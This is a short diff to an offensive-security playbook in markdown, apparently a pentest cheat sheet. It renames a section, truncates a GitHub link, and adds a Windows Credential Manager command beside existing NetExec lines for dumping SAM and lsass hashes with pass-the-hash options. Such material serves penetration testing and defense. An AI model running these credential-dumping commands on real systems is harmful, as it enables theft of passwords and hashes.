@@ -1,4 +1,4 @@
-https://github.com/NotMedic/NetNTLMtoSilverTicket
+://github.com/NotMedic/NetNTLMtoSilverTicket
 
 
 # Gunnajs-Playbook
@@ -488,7 +488,7 @@ grep -i <keyword> *
 </details> 
 
 <details>
-  <summary> NetExec local authentication </summary> 
+  <summary> local authentication </summary> 
   
   ### Dump SAM on local computer
   ```shell
@@ -503,6 +503,11 @@ grep -i <keyword> *
   ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
   ```shell
   NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
+  ```
+
+### Stored User Names and Passwords on Windows Credential Manager
+  ```shell
+  rundll32.exe keymgr.dll KRShowKeyMgr
   ```
   
 </details> 
